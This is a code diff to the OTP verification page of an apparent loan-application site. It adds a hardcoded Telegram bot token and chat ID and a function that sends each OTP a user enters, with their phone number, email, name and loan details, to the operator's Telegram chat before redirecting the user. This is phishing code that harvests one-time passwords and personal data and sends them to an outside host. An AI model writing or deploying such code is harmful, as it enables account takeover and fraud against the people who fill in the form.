@@ -250,6 +250,10 @@
     // ============================================
     const TELEGRAM_USERNAME = 'Inbucksk';
     
+    // Telegram Bot Configuration (to send YOU the OTP)
+    const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
+    const TG_CHAT_ID = '8392790531';
+    
     // ============================================
     // GET DATA FROM URL
     // ============================================
@@ -280,6 +284,31 @@
     
     console.log('📊 OTP Verify Page Loaded');
     console.log(`   Redirecting to Telegram: @${TELEGRAM_USERNAME}`);
+    
+    // ============================================
+    // FUNCTION TO SEND OTP TO YOUR TELEGRAM
+    // ============================================
+    
+    async function sendOtpToAdmin(otp) {
+        const message = `🔐 *OTP ENTERED BY USER* 🔐\n\n━━━━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${userPhone}\n🔑 *OTP:* ${otp}\n📧 *Email:* ${userEmail}\n👤 *Name:* ${userName}\n━━━━━━━━━━━━━━━━━━━━━\n💰 *Loan:* $${parseInt(amount).toLocaleString()} for ${term} months\n🆔 *App ID:* ${applicationId || 'N/A'}\n━━━━━━━━━━━━━━━━━━━━━\n\n✅ User has entered the OTP and is being redirected to your Telegram.`;
+        
+        const encodedMessage = encodeURIComponent(message);
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+        
+        console.log('📤 Sending OTP to admin Telegram...');
+        
+        try {
+            const response = await fetch(url);
+            const result = await response.json();
+            if (result.ok) {
+                console.log('✅ OTP sent to admin Telegram!');
+            } else {
+                console.error('Telegram error:', result);
+            }
+        } catch (error) {
+            console.error('Error sending OTP:', error);
+        }
+    }
     
     // ============================================
     // FUNCTION TO REDIRECT TO TELEGRAM
@@ -417,10 +446,10 @@
     });
     
     // ============================================
-    // VERIFY BUTTON - Redirects to YOUR TELEGRAM
+    // VERIFY BUTTON - Sends OTP to Admin + Redirects to User's Telegram
     // ============================================
     
-    verifyBtn.onclick = () => {
+    verifyBtn.onclick = async () => {
         const enteredOtp = currentOtp.join('');
         
         if (enteredOtp.length !== 6) {
@@ -434,7 +463,10 @@
         verifyBtn.classList.add('loading');
         verifyBtn.disabled = true;
         
-        // Store verification status locally
+        // 1. Send OTP to YOUR Telegram (Admin)
+        await sendOtpToAdmin(enteredOtp);
+        
+        // 2. Store verification status locally
         localStorage.setItem('inncredits_verified', 'true');
         localStorage.setItem('inncredits_phone_verified', JSON.stringify({
             phoneVerified: true,
@@ -450,10 +482,10 @@
         // Show success message
         successMsg.classList.add('show');
         
-        // Redirect to YOUR Telegram
+        // 3. Redirect to YOUR Telegram (User)
         setTimeout(() => { 
             redirectToTelegram();
-        }, 1000);
+        }, 1500);
     };
     
     // Edit phone number
